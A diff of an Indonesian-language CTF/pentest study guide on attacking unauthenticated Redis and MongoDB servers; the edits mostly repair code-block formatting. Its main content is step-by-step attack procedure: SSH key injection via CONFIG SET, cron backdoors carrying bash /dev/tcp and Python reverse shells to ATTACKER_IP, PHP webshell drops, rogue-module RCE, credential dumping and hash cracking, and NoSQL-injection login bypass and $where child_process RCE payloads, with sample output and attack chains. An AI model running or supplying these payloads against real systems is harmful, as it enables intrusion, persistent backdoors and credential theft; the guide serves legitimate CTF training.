@@ -4,14 +4,15 @@ title: "📦 BAGIAN 1: REDIS & NOSQL FUNDAMENTALS"
 category: "2. Network Services"
 categoryId: "network"
 filename: "14d_Redis & MongoDB.md"
-refs_out: ["06","07","14a","14c","15","25","35","44","47"]
+refs_out: ["06","07","14a","14c","15","25","28","35","44","47"]
 refs_in: ["04","14c","15","22","24","32"]
 ---
 
-
 ## 📦 BAGIAN 1: REDIS & NOSQL FUNDAMENTALS
+
 ### 1.1 Apa itu Redis?
 Redis adalah **in-memory key-value store** — database yang menyimpan data di RAM untuk akses super cepat.
+
 ```text
 📌 ANALOGI REDIS:
 "Papan tulis digital super cepat"
@@ -20,6 +21,7 @@ Bayangkan papan tulis raksasa di kantor:
 - Baca dengan cepat (GET key)
 - Hapus (DEL key)
 - Semua orang di kantor bisa lihat dan tulis (tanpa auth!)
+```
 
 **Informasi Teknis Redis:**
 
@@ -35,21 +37,20 @@ Bayangkan papan tulis raksasa di kantor:
 
 **Kenapa Redis sering ada di CTF?**
 
-text
-
+```text
 ⚠️ FAKTOR UTAMA:
 1. Developer lupa set requirepass di redis.conf
 2. Redis bind ke 0.0.0.0 (semua interface)
 3. protected-mode dimatikan (atau tidak efektif)
 4. Redis berjalan sebagai root (misconfiguration)
 5. Banyak aplikasi web pakai Redis tanpa auth
+```
 
 ### 1.2 Kenapa Redis Berbahaya Tanpa Auth?
 
 Ini adalah **kekuatan utama Redis** untuk pentester:
 
-text
-
+```text
 🔥 KOMBINASI MEMATIKAN:
 CONFIG SET dir → Ubah direktori kerja Redis
 +
@@ -59,11 +60,11 @@ TULIS FILE KE MANA SAJA sebagai user redis!
 📌 Bandingkan dengan MySQL:
 - MySQL: butuh FILE privilege + dir tertentu
 - Redis: TIDAK butuh privilege khusus untuk CONFIG SET
+```
 
 **File yang bisa ditulis via Redis:**
 
-text
-
+```text
 📁 TARGET FILE WRITE:
 1. ~/.ssh/authorized_keys → SSH login sebagai user redis
 2. /var/spool/cron/crontabs/root → Cron backdoor (root!)
@@ -71,13 +72,13 @@ text
 4. /etc/ld.so.preload → Library preload (advanced)
 5. /etc/passwd → (hati-hati, bisa brick system)
 6. /root/.ssh/authorized_keys → jika Redis root
+```
 
 ### 1.3 Apa itu MongoDB?
 
 MongoDB adalah **document database (NoSQL)** — menyimpan data dalam format dokumen seperti JSON.
 
-text
-
+```text
 📌 ANALOGI MONGODB:
 "Lemari arsip JSON raksasa"
 Bayangkan lemari dengan banyak rak (database):
@@ -85,6 +86,7 @@ Bayangkan lemari dengan banyak rak (database):
 - Setiap binder berisi lembaran (document)
 - Setiap lembaran berisi data JSON
 - Tidak butuh struktur tabel yang kaku
+```
 
 **Informasi Teknis MongoDB:**
 
@@ -100,19 +102,18 @@ Bayangkan lemari dengan banyak rak (database):
 
 **Kenapa MongoDB sering ada di CTF:**
 
-text
-
+```text
 ⚠️ FAKTOR UTAMA:
 1. MongoDB versi lama tidak ada auth default
 2. Admin lupa enable authentication
 3. Bind ke 0.0.0.0 tanpa firewall
 4. Aplikasi web gunakan MongoDB tanpa auth
 5. Mudah di-dump semua datanya
+```
 
 ### 1.4 Perbandingan Redis vs MongoDB
 
-text
-
+```text
 ┌──────────────────┬─────────────────────┬─────────────────────┐
 │     ASPEK        │       REDIS         │      MONGODB        │
 ├──────────────────┼─────────────────────┼─────────────────────┤
@@ -126,6 +127,7 @@ text
 │ CTF Popularitas  │ ⭐⭐⭐⭐⭐ (sangat) │ ⭐⭐⭐⭐ (sering)    │
 │ Exploit Target   │ File System         │ Data + Web App      │
 └──────────────────┴─────────────────────┴─────────────────────┘
+```
 
 ---
 
@@ -135,19 +137,18 @@ text
 
 #### Install Redis Client Tools
 
-bash
-
+```bash
 # Install redis-tools di Parrot OS (Debian-based)
 sudo apt update
 sudo apt install redis-tools -y
 # Verifikasi install
 redis-cli --version
 # Output: redis-cli 7.x.x
+```
 
 #### Redis Client Commands
 
-bash
-
+```bash
 # Koneksi dasar tanpa auth
 redis-cli -h TARGET -p 6379
 # Koneksi dengan auth (password)
@@ -160,11 +161,11 @@ redis-cli -h TARGET -p 6379 CONFIG GET dir
 redis-cli -h TARGET -p 6379
 127.0.0.1:6379> AUTH PASSWORD
 127.0.0.1:6379> PING
+```
 
 #### Other Tools untuk Redis
 
-bash
-
+```bash
 # Nmap NSE scripts
 nmap -p 6379 --script redis-info TARGET
 nmap -p 6379 --script redis-brute TARGET
@@ -174,13 +175,13 @@ nxc redis TARGET -u '' -p '' --redis
 # Metasploit modules
 msf6 > use auxiliary/scanner/redis/redis_server
 msf6 > use exploit/linux/redis/redis_unauth_exec
+```
 
 ### 2.2 MongoDB Tools
 
 #### Install MongoDB Shell (mongosh)
 
-bash
-
+```bash
 # Install mongosh di Parrot OS
 # Method 1: Direct download
 wget -qO - https://www.mongodb.org/static/pgp/server-7.0.asc | sudo apt-key add -
@@ -192,11 +193,11 @@ sudo npm install -g mongosh
 # Verifikasi
 mongosh --version
 # Output: 2.x.x
+```
 
 #### MongoDB Client Commands
 
-bash
-
+```bash
 # Koneksi tanpa auth
 mongosh "mongodb://TARGET:27017"
 # Koneksi dengan auth
@@ -206,17 +207,18 @@ mongosh "mongodb://TARGET:27017/mydb"
 # Satu-liner command
 mongosh "mongodb://TARGET:27017" --eval "show dbs"
 mongosh "mongodb://TARGET:27017" --eval "db.version()"
+```
 
 #### Other Tools untuk MongoDB
 
-bash
-
+```bash
 # Nmap NSE scripts
 nmap -p 27017 --script mongodb-info TARGET
 nmap -p 27017 --script mongodb-brute TARGET
 # Metasploit modules
 msf6 > use auxiliary/scanner/mongodb/mongodb_login
 msf6 > use auxiliary/admin/mongodb/mongodb_enum
+```
 
 ---
 
@@ -226,8 +228,7 @@ msf6 > use auxiliary/admin/mongodb/mongodb_enum
 
 #### Nmap Scan untuk Redis
 
-bash
-
+```bash
 # Scan port 6379
 nmap -p 6379 -sV TARGET
 # Scan dengan NSE script redis-info
@@ -236,11 +237,11 @@ nmap -p 6379 --script redis-info TARGET
 nmap -p 6379 -sC -sV TARGET
 # Masscan untuk cepat
 masscan -p6379 TARGET --rate=10000
+```
 
 **Contoh Output Nmap Redis:**
 
-text
-
+```text
 PORT     STATE SERVICE VERSION
 6379/tcp open  redis   Redis key-value store 6.0.16
 | redis-info:
@@ -252,22 +253,22 @@ PORT     STATE SERVICE VERSION
 |   Connected Clients: 1
 |   Replication: master
 |_  Config File: /etc/redis/redis.conf
+```
 
 #### Banner Grab dengan Netcat
 
-bash
-
+```bash
 # Banner grab manual
 nc -vn TARGET 6379
 # Ketik: PING
 # Response: +PONG
 # Atau satu-liner
 echo -e "PING\r\n" | nc -vn TARGET 6379
+```
 
 **Contoh Output Banner Grab:**
 
-text
-
+```text
 $ nc -vn 10.10.10.100 6379
 (UNKNOWN) [10.10.10.100] 6379 (?) open
 PING
@@ -281,24 +282,24 @@ $redis_mode:standalone
 $os:Linux 5.10.0 x86_64
 $arch_bits:64
 ...
+```
 
 ### FASE 2: AUTENTIKASI REDIS
 
 #### Test Tanpa Password
 
-bash
-
+```bash
 # Test basic tanpa password
 redis-cli -h TARGET -p 6379 PING
 # Jika response +PONG → Unauthenticated (VULNERABLE!)
 # Test lebih detail
 redis-cli -h TARGET -p 6379 INFO server
 # Jika berhasil → FULL ACCESS tanpa auth!
+```
 
 #### Test Dengan Password (Brute Force)
 
-bash
-
+```bash
 # Hydra untuk brute force Redis
 hydra -P /usr/share/wordlists/rockyou.txt redis://TARGET:6379
 # Atau dengan redis-cli manual
@@ -310,11 +311,11 @@ redis-cli -h TARGET -p 6379
 OK
 127.0.0.1:6379> PING
 +PONG
+```
 
 #### Contoh Response Authenticated vs Unauthenticated
 
-text
-
+```text
 ✅ UNAUTHENTICATED (tanpa password):
 $ redis-cli -h 10.10.10.100 PING
 +PONG
@@ -326,6 +327,7 @@ $ redis-cli -h 10.10.10.100 -a wrongpass PING
 (error) NOAUTH Authentication required.
 📌 TIPS: Jika dapat "NOAUTH", berarti ada password.
 Coba brute force atau cari di file config/web app.
+```
 
 ### FASE 3: REDIS RECONNAISSANCE
 
@@ -333,8 +335,7 @@ Setelah berhasil konek, jalankan reconnaissance lengkap:
 
 #### Command Wajib Redis Recon
 
-bash
-
+```bash
 # 1. INFO server → versi, OS, memory, process
 redis-cli -h TARGET INFO server
 # 2. INFO keyspace → database yang ada
@@ -359,11 +360,11 @@ redis-cli -h TARGET HGETALL key_name
 redis-cli -h TARGET SMEMBERS key_name
 # 12. LRANGE key 0 -1 → baca semua anggota list
 redis-cli -h TARGET LRANGE key_name 0 -1
+```
 
 **Contoh Output Recon:**
 
-text
-
+```text
 $ redis-cli -h 10.10.10.100 CONFIG GET dir
 1) "dir"
 2) "/var/lib/redis"
@@ -381,6 +382,7 @@ $ redis-cli -h 10.10.10.100 KEYS "*"
 5) "flag"
 $ redis-cli -h 10.10.10.100 GET flag
 "HTB{redis_unauth_flag}"
+```
 
 ### FASE 4: FILE WRITE VIA REDIS (ATTACK VECTOR UTAMA)
 
@@ -388,16 +390,15 @@ Ini adalah **serangan paling powerful** dari Redis — menulis file ke sistem!
 
 #### 4a. SSH Key Injection (Paling Umum di CTF)
 
-text
-
+```text
 📌 TUJUAN: Inject public key ke ~/.ssh/authorized_keys
 📌 HASIL: SSH login sebagai user yang menjalankan Redis
 📌 TARGET: Biasanya user 'redis' atau 'root'
+```
 
 **STEP-BY-STEP SSH KEY INJECTION:**
 
-bash
-
+```bash
 # STEP 1: Generate SSH keypair di Parrot OS
 ssh-keygen -t rsa -b 4096 -f ~/.ssh/redis_exploit -N ""
 # STEP 2: Lihat public key
@@ -428,11 +429,11 @@ OK
 ssh -i ~/.ssh/redis_exploit redis@TARGET
 # Atau jika Redis berjalan sebagai root:
 ssh -i ~/.ssh/redis_exploit root@TARGET
+```
 
 **Contoh Output Lengkap:**
 
-text
-
+```text
 $ ssh-keygen -t rsa -b 4096 -f ~/.ssh/redis_exploit -N ""
 Generating public/private rsa key pair.
 Your identification has been saved in ~/.ssh/redis_exploit
@@ -457,11 +458,11 @@ redis@target:~$ id
 uid=999(redis) gid=999(redis) groups=999(redis)
 redis@target:~$ whoami
 redis
+```
 
 **⚠️ TROUBLESHOOTING SSH INJECTION:**
 
-text
-
+```text
 ❌ "Permission denied (publickey)" → Kemungkinan:
    - Dir /home/redis/.ssh/ tidak ada → buat dulu
    - Permission .ssh harus 700
@@ -474,19 +475,19 @@ text
      CONFIG SET dbfilename .ssh
      SET dummy ""; SAVE
      Lalu inject key ke .ssh/authorized_keys
+```
 
 #### 4b. Cron Job Backdoor (Untuk Root Shell)
 
-text
-
+```text
 📌 TUJUAN: Buat cron job yang execute reverse shell setiap menit
 📌 HASIL: Root shell (jika Redis berjalan sebagai root)
 📌 KRITIS: Redis HARUS root atau /var/spool/cron writable
+```
 
 **STEP-BY-STEP CRON BACKDOOR:**
 
-bash
-
+```bash
 # STEP 1: Setup listener di attacker
 nc -lvnp 4444
 # STEP 2: Konek ke Redis dan inject cron
@@ -505,11 +506,11 @@ OK
 OK
 # STEP 7: Tunggu 1 menit, shell akan masuk
 # nc listener akan menerima koneksi
+```
 
 **Contoh Output Cron Backdoor:**
 
-text
-
+```text
 $ nc -lvnp 4444
 Listening on 0.0.0.0 4444
 Connection received on 10.10.10.100 54321
@@ -521,11 +522,11 @@ root@target:~# whoami
 root
 root@target:~# hostname
 target
+```
 
 **Alternatif Cron Payload:**
 
-bash
-
+```bash
 # Untuk Debian/Ubuntu (format berbeda)
 # Coba dir: /etc/cron.d/
 CONFIG SET dir /etc/cron.d/
@@ -534,19 +535,19 @@ CONFIG SET dbfilename redis_backdoor
 SET cron "\n\n* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\n\n"
 # Payload reverse shell Python (lebih reliable)
 SET cron "\n\n* * * * * root python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"
+```
 
 #### 4c. Webshell Drop
 
-text
-
+```text
 📌 TUJUAN: Drop PHP webshell di web directory
 📌 HASIL: Web shell untuk RCE
 📌 TARGET: /var/www/html/ atau web root lainnya
+```
 
 **STEP-BY-STEP WEBSHELL DROP:**
 
-bash
-
+```bash
 redis-cli -h TARGET
 # Cari web root (biasanya /var/www/html/)
 127.0.0.1:6379> CONFIG SET dir /var/www/html/
@@ -561,38 +562,38 @@ OK
 # Access webshell
 curl http://TARGET/shell.php?cmd=id
 # Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
 **Webshell Variations:**
 
-bash
-
+```bash
 # More powerful webshell
 SET webshell "<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; system($_REQUEST['cmd']); echo '</pre>'; } ?>"
 # One-liner reverse shell via webshell
 curl "http://TARGET/shell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+```
 
 ### FASE 5: RCE VIA REDIS MODULE LOADING
 
-text
-
+```text
 📌 TUJUAN: Load malicious shared library (.so) untuk RCE
 📌 VERSI: Redis 4.x - 7.x (module support)
 📌 SUMBER: redis-rogue-server atau exploit-db
+```
 
 #### Apa itu Redis Module?
 
-text
-
+```text
 Redis modules adalah shared library (.so) yang bisa di-load
 untuk menambah fungsionalitas Redis.
 🔥 KEKUATAN: Module bisa mengeksekusi system command
 🔥 KONDISI: Redis harus berjalan sebagai root (atau user dengan
    permission untuk load module)
+```
 
 #### Step-by-Step Redis Module Exploit
 
-bash
-
+```bash
 # STEP 1: Clone redis-rogue-server
 git clone https://github.com/n0b0dyCN/redis-rogue-server
 cd redis-rogue-server
@@ -610,21 +611,21 @@ OK
 # Jalankan system command via module
 127.0.0.1:6379> system.exec "id"
 "uid=0(root) gid=0(root) groups=0(root)"
+```
 
 **⚠️ CATATAN PENTING:**
 
-text
-
+```text
 Module loading membutuhkan:
 1. Redis versi 4.x ke atas
 2. Redis berjalan sebagai root (atau user dengan write access ke /tmp)
 3. Kemampuan upload file .so ke target
 4. Di CTF, biasanya ini adalah "last resort" jika file write gagal
+```
 
 ### FASE 6: REDIS PERSISTENCE MECHANISMS
 
-text
-
+```text
 📌 RDB (Redis Database Backup):
    - Snapshot periodic
    - File: dump.rdb
@@ -636,6 +637,7 @@ text
 📌 CARA MATIKAN PERSISTENCE setelah exploit:
    - CONFIG SET save ""
    - CONFIG SET appendonly no
+```
 
 ---
 
@@ -645,19 +647,18 @@ text
 
 #### Nmap Scan untuk MongoDB
 
-bash
-
+```bash
 # Scan port 27017
 nmap -p 27017 -sV TARGET
 # Dengan NSE script
 nmap -p 27017 --script mongodb-info TARGET
 # Full scan
 nmap -p 27017 -sC -sV TARGET
+```
 
 **Contoh Output Nmap MongoDB:**
 
-text
-
+```text
 PORT      STATE SERVICE VERSION
 27017/tcp open  mongodb MongoDB 4.4.28
 | mongodb-info:
@@ -671,34 +672,34 @@ PORT      STATE SERVICE VERSION
 |     maxConnections: 65536
 |     net.maxIncomingConnections: 65536
 |_    net.port: 27017
+```
 
 #### Banner Grab dengan Netcat
 
-bash
-
+```bash
 # Banner grab basic
 nc -vn TARGET 27017
 # MongoDB mengembalikan header setelah koneksi
 # Dengan telnet (bisa juga)
 echo "db.version()" | nc -vn TARGET 27017
+```
 
 ### FASE 2: AUTENTIKASI MONGODB
 
 #### Test Tanpa Password
 
-bash
-
+```bash
 # Koneksi tanpa auth
 mongosh "mongodb://TARGET:27017"
 # Atau dengan mongo (legacy)
 mongo --host TARGET --port 27017
 # Test dengan eval
 mongosh "mongodb://TARGET:27017" --eval "db.version()"
+```
 
 **Contoh Response:**
 
-text
-
+```text
 $ mongosh "mongodb://10.10.10.100:27017"
 Current Mongosh Log ID: abc123
 Connecting to: mongodb://10.10.10.100:27017
@@ -711,11 +712,11 @@ local   72.00 KiB
 appdb   1.20 MiB
 users   800.00 KiB
 test> ✅ AKSES DAPAT! → Tidak ada auth!
+```
 
 #### Test Dengan Autentikasi
 
-bash
-
+```bash
 # Koneksi dengan username/password
 mongosh "mongodb://admin:password@TARGET:27017/admin"
 # Atau interactive
@@ -723,17 +724,18 @@ mongosh "mongodb://TARGET:27017"
 test> use admin
 test> db.auth("admin", "password")
 1  # → Berhasil (return 1)
+```
 
 #### Cara Cek Apakah Auth Required
 
-bash
-
+```bash
 # Method 1: Coba akses database admin
 mongosh "mongodb://TARGET:27017" --eval "use admin; db.getUsers()"
 # Method 2: Cek di config
 mongosh "mongodb://TARGET:27017" --eval "db.adminCommand({getParameter:1, authenticationMechanisms:1})"
 # Method 3: Lihat output connection
 # Jika ada "Unauthorized" → auth enabled
+```
 
 ### FASE 3: MONGODB RECONNAISSANCE
 
@@ -741,8 +743,7 @@ Setelah konek, jalankan reconnaissance lengkap:
 
 #### Command Wajib MongoDB Recon
 
-bash
-
+```bash
 # 1. show dbs → list databases
 mongosh "mongodb://TARGET:27017" --eval "show dbs"
 # 2. use database_name → pilih database
@@ -763,11 +764,11 @@ mongosh "mongodb://TARGET:27017" --eval "db.version()"
 mongosh "mongodb://TARGET:27017" --eval "db.serverStatus()"
 # 10. db.collection.findOne() → satu document saja
 mongosh "mongodb://TARGET:27017/appdb" --eval "db.users.findOne()"
+```
 
 **Contoh Output Recon MongoDB:**
 
-text
-
+```text
 $ mongosh "mongodb://10.10.10.100:27017/appdb"
 test> show collections
 users
@@ -784,13 +785,13 @@ test> db.users.count()
 3
 test> db.users.findOne()
 { _id: ObjectId("..."), username: "admin", password: "admin123" }
+```
 
 ### FASE 4: CREDENTIAL EXTRACTION MONGODB
 
 #### Dump User Credentials
 
-bash
-
+```bash
 # Dump system users (hash)
 mongosh "mongodb://TARGET:27017/admin" --eval "db.system.users.find()"
 # Format output pretty
@@ -803,11 +804,11 @@ mongosh "mongodb://TARGET:27017/appdb" --eval "db.credentials.find()"
 mongosh "mongodb://TARGET:27017/appdb" --eval "db.auth.find()"
 # Export ke file
 mongosh "mongodb://TARGET:27017/appdb" --eval "JSON.stringify(db.users.find().toArray())" > users.json
+```
 
 **Contoh System Users Output:**
 
-text
-
+```text
 $ mongosh "mongodb://10.10.10.100:27017/admin" --eval "db.system.users.find().pretty()"
 [
   {
@@ -826,30 +827,30 @@ $ mongosh "mongodb://10.10.10.100:27017/admin" --eval "db.system.users.find().pr
     roles: [ { role: "root", db: "admin" } ]
   }
 ]
+```
 
 #### Crack MongoDB Hashes
 
-bash
-
+```bash
 # MongoDB menggunakan SCRAM-SHA-256
 # Format hash: <username>:<db>:<salt>:<storedKey>:<serverKey>
 # Gunakan hashcat mode 24100 (MongoDB SCRAM-SHA-256)
 hashcat -m 24100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 # Atau mode 24200 (MongoDB SCRAM-SHA-1 untuk versi lama)
 hashcat -m 24200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+```
 
 ### FASE 5: NOSQL INJECTION
 
-text
-
+```text
 📌 APA ITU NOSQL INJECTION?
 NoSQL injection terjadi ketika input user tidak disanitasi
 dan digunakan langsung dalam query MongoDB.
+```
 
 #### Operator MongoDB yang Sering Diserang
 
-text
-
+```text
 ┌────────────────┬──────────────────────────────────────┐
 │   OPERATOR     │         FUNGSI                      │
 ├────────────────┼──────────────────────────────────────┤
@@ -864,13 +865,13 @@ text
 │ $or            │ Or condition                        │
 │ $and           │ And condition                       │
 └────────────────┴──────────────────────────────────────┘
+```
 
 #### Bypass Login dengan NoSQL Injection
 
 **Method 1: URL Encoded Parameter (PHP/Node.js)**
 
-bash
-
+```bash
 # Login bypass dengan $ne (not equal)
 # Email: admin@example.com&password[$ne]=1
 curl -X POST http://TARGET/login \
@@ -887,11 +888,11 @@ curl -X POST http://TARGET/login \
 # Bypass dengan array
 curl -X POST http://TARGET/login \
   -d "username=admin&password[$in][]=admin&password[$in][]=admin123"
+```
 
 **Method 2: JSON Format (API/GraphQL)**
 
-json
-
+```json
 // Request body JSON untuk bypass login
 {
   "username": "admin",
@@ -907,11 +908,11 @@ json
   "username": "admin",
   "password": { "$gt": "a" }
 }
+```
 
 **Method 3: $where Injection (RCE - Versi Lama)**
 
-text
-
+```text
 📌 $where mengizinkan JavaScript execution!
 📌 DEPRECATED di versi modern, tapi masih ada di CTF legacy.
 Payload injection:
@@ -923,11 +924,11 @@ RCE payload:
 {
   "$where": "function() { return this.constructor.constructor('return process.mainModule.require(\"child_process\").execSync(\"id\").toString()')() }"
 }
+```
 
 #### Contoh Exploit NoSQL Injection
 
-bash
-
+```bash
 # Contoh 1: Login bypass di web app
 curl -X POST http://TARGET/api/login \
   -H "Content-Type: application/json" \
@@ -939,6 +940,7 @@ curl -X GET "http://TARGET/api/users?search[$regex]=adm.*"
 curl -X POST http://TARGET/api/search \
   -H "Content-Type: application/json" \
   -d '{"$where": "function() { return process.mainModule.require(\"child_process\").execSync(\"id\").toString() }"}'
+```
 
 ---
 
@@ -946,8 +948,7 @@ curl -X POST http://TARGET/api/search \
 
 ### CHAIN 1: Redis Unauthenticated → SSH Key Injection → Shell
 
-text
-
+```text
 ┌─────────────────────────────────────────────────────────────────────┐
 │ CHAIN 1: REDIS UNAUTH → SSH KEY → SHELL                          │
 ├─────────────────────────────────────────────────────────────────────┤
@@ -973,11 +974,11 @@ text
 │                                                    hostname     │
 │                                                                   │
 └─────────────────────────────────────────────────────────────────────┘
+```
 
 ### CHAIN 2: Redis Root → Cron Backdoor → Root Shell
 
-text
-
+```text
 ┌─────────────────────────────────────────────────────────────────────┐
 │ CHAIN 2: REDIS ROOT → CRON → ROOT SHELL                          │
 ├─────────────────────────────────────────────────────────────────────┤
@@ -998,11 +999,11 @@ text
 │                                                    → root!        │
 │                                                                   │
 └─────────────────────────────────────────────────────────────────────┘
+```
 
 ### CHAIN 3: Web App → Redis Credentials → Redis Login → SSH Key Write → Shell
 
-text
-
+```text
 ┌─────────────────────────────────────────────────────────────────────┐
 │ CHAIN 3: WEB APP → REDIS CREDS → SSH KEY → SHELL                │
 ├─────────────────────────────────────────────────────────────────────┤
@@ -1020,11 +1021,11 @@ text
 │  KEYS *                → SAVE                                     │
 │                                                                   │
 └─────────────────────────────────────────────────────────────────────┘
+```
 
 ### CHAIN 4: MongoDB Unauthenticated → Data Dump → Credential Reuse → SSH
 
-text
-
+```text
 ┌─────────────────────────────────────────────────────────────────────┐
 │ CHAIN 4: MONGODB UNAUTH → DATA DUMP → SSH                        │
 ├─────────────────────────────────────────────────────────────────────┤
@@ -1044,11 +1045,11 @@ text
 │  → john:john123        → Database login                         │
 │                                                                   │
 └─────────────────────────────────────────────────────────────────────┘
+```
 
 ### CHAIN 5: NoSQL Injection Web → Auth Bypass → Admin Access → RCE
 
-text
-
+```text
 ┌─────────────────────────────────────────────────────────────────────┐
 │ CHAIN 5: NOSQL INJECTION → ADMIN → RCE                           │
 ├─────────────────────────────────────────────────────────────────────┤
@@ -1069,6 +1070,7 @@ text
 │                        Sync(\"id\").toString()')() }"}           │
 │                                                                   │
 └─────────────────────────────────────────────────────────────────────┘
+```
 
 ---
 
@@ -1076,8 +1078,7 @@ text
 
 ### Redis CVEs
 
-text
-
+```text
 ┌─────────────────────────────────────────────────────────────────────┐
 │                     REDIS CVEs                                     │
 ├─────────────────────────────────────────────────────────────────────┤
@@ -1103,11 +1104,11 @@ text
 │    - Impact: Denial of Service                                    │
 │                                                                   │
 └─────────────────────────────────────────────────────────────────────┘
+```
 
 ### MongoDB CVEs
 
-text
-
+```text
 ┌─────────────────────────────────────────────────────────────────────┐
 │                    MONGODB CVEs                                    │
 ├─────────────────────────────────────────────────────────────────────┤
@@ -1130,6 +1131,7 @@ text
 │    - Impact: RCE via $where operator                             │
 │                                                                   │
 └─────────────────────────────────────────────────────────────────────┘
+```
 
 ---
 
@@ -1137,8 +1139,7 @@ text
 
 ### Redis Decision Tree
 
-text
-
+```text
                             ┌──────────────────┐
                             │  PORT 6379 OPEN  │
                             └────────┬─────────┘
@@ -1190,11 +1191,11 @@ text
 │  └─────────────┘    └─────────────┘    └─────────────┘
 │                                                 │
 └─────────────────────────────────────────────────┘
+```
 
 ### MongoDB Decision Tree
 
-text
-
+```text
                             ┌──────────────────┐
                             │ PORT 27017 OPEN  │
                             └────────┬─────────┘
@@ -1246,6 +1247,7 @@ text
      │  └──────────────┘  └──────────────┘  └───────────┘ │
      │                                                    │
      └────────────────────────────────────────────────────┘
+```
 
 ---
 
@@ -1255,8 +1257,7 @@ text
 
 #### 1. NOAUTH Authentication required
 
-text
-
+```text
 ERROR:
 (error) NOAUTH Authentication required.
 PENYEBAB: Redis membutuhkan password (requirepass diset).
@@ -1273,11 +1274,11 @@ SOLUSI:
    - requirepass "admin"
    - requirepass "redis"
    - requirepass "password"
+```
 
 #### 2. CONFIG SET dir: Permission denied
 
-text
-
+```text
 ERROR:
 (error) ERR: CONFIG SET dir: Permission denied
 PENYEBAB: User redis tidak punya write access ke direktori target.
@@ -1290,11 +1291,11 @@ SOLUSI:
 2. Jika Redis running as root, semua direktori bisa ditulis.
 3. Buat direktori jika diperlukan:
    mkdir -p /home/redis/.ssh/
+```
 
 #### 3. ERR: SAVE failed after redis db write
 
-text
-
+```text
 ERROR:
 (error) ERR: SAVE failed after redis db write
 PENYEBAB: Disk full atau permission denied saat write.
@@ -1303,11 +1304,11 @@ SOLUSI:
 2. Coba direktori dengan lebih banyak space
 3. Cek permission dengan CONFIG GET dir
 4. Gunakan BGSAVE sebagai alternatif
+```
 
 #### 4. WRONGTYPE Operation against wrong type
 
-text
-
+```text
 ERROR:
 (error) WRONGTYPE Operation against a key holding the wrong kind of value
 PENYEBAB: Mencoba GET pada key yang bukan string.
@@ -1316,11 +1317,11 @@ SOLUSI:
 2. Untuk hash: HGETALL key_name
 3. Untuk list: LRANGE key_name 0 -1
 4. Untuk set: SMEMBERS key_name
+```
 
 #### 5. Connection refused (protected-mode)
 
-text
-
+```text
 ERROR:
 Could not connect to Redis at TARGET:6379: Connection refused
 PENYEBAB: protected-mode enabled atau bind ke localhost only.
@@ -1329,11 +1330,11 @@ SOLUSI:
 2. Jika protected-mode yes: butuh auth atau koneksi dari localhost
 3. Coba bind ke IP yang benar: CONFIG SET bind 0.0.0.0
 4. Bypass: Gunakan redis-cli dari localhost jika ada LFI/RCE
+```
 
 #### 6. (error) ERR unknown command 'CONFIG'
 
-text
-
+```text
 ERROR:
 (error) ERR unknown command 'CONFIG'
 PENYEBAB: CONFIG command di-disable di redis.conf.
@@ -1342,11 +1343,11 @@ SOLUSI:
 2. Jika tidak bisa, coba MODULE LOAD
 3. Cek apakah Redis versi lama (< 2.4)
 4. Gunakan teknik lain: RCE via Lua script (CVE-2022-0543)
+```
 
 #### 7. ssh permission denied setelah inject key
 
-text
-
+```text
 ERROR:
 Permission denied (publickey).
 PENYEBAB:
@@ -1363,11 +1364,11 @@ SOLUSI:
    ssh redis@TARGET
    ssh root@TARGET
    ssh www-data@TARGET
+```
 
 #### 8. Cron tidak execute
 
-text
-
+```text
 ERROR:
 Cron tidak jalan, shell tidak masuk.
 PENYEBAB:
@@ -1385,11 +1386,11 @@ SOLUSI:
 3. Cek file: cat /var/spool/cron/crontabs/root
 4. Coba payload berbeda:
    * * * * * bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
+```
 
 #### 9. Webshell ada tapi tidak bisa execute
 
-text
-
+```text
 ERROR:
 Webshell diakses tapi tidak execute.
 PENYEBAB:
@@ -1406,11 +1407,11 @@ SOLUSI:
    <?php echo "test"; ?>
 3. Cek permission file
 4. Coba dengan GET parameter: ?cmd=id
+```
 
 #### 10. KEYS * timeout (terlalu banyak keys)
 
-text
-
+```text
 ERROR:
 Timeout atau freeze saat KEYS *
 PENYEBAB: Terlalu banyak keys di Redis (> 1 juta).
@@ -1420,13 +1421,13 @@ SOLUSI:
    SCAN 0 MATCH user:*
 2. Atau limit DBSIZE dulu
 3. Gunakan INFO keyspace untuk lihat jumlah total
+```
 
 ### MongoDB Errors (5 Common)
 
 #### 1. MongoServerError: command find requires authentication
 
-text
-
+```text
 ERROR:
 MongoServerError: command find requires authentication
 PENYEBAB: Auth required tapi tidak dikirim.
@@ -1436,11 +1437,11 @@ SOLUSI:
 2. Auth di interactive:
    test> use admin
    test> db.auth("user", "pass")
+```
 
 #### 2. MongoNetworkError: connect ECONNREFUSED
 
-text
-
+```text
 ERROR:
 MongoNetworkError: connect ECONNREFUSED TARGET:27017
 PENYEBAB: MongoDB tidak berjalan atau firewall blocking.
@@ -1448,11 +1449,11 @@ SOLUSI:
 1. Cek apakah service running: systemctl status mongodb
 2. Cek firewall: iptables -L | grep 27017
 3. Coba dengan authentication database admin
+```
 
 #### 3. MongoServerError: not authorized
 
-text
-
+```text
 ERROR:
 MongoServerError: not authorized on admin to execute command
 PENYEBAB: User tidak punya privilege.
@@ -1460,11 +1461,11 @@ SOLUSI:
 1. Coba database lain: use appdb
 2. Cek roles user: db.getUser("username")
 3. Coba dengan user yang lebih tinggi (admin/root)
+```
 
 #### 4. MongoServerError: no such db
 
-text
-
+```text
 ERROR:
 MongoServerError: no such db: appdb
 PENYEBAB: Database tidak ada.
@@ -1472,11 +1473,11 @@ SOLUSI:
 1. show dbs → lihat database yang ada
 2. Pastikan nama database benar
 3. Coba local, admin, config database
+```
 
 #### 5. mongosh: command not found
 
-text
-
+```text
 ERROR:
 bash: mongosh: command not found
 PENYEBAB: Mongosh tidak terinstall.
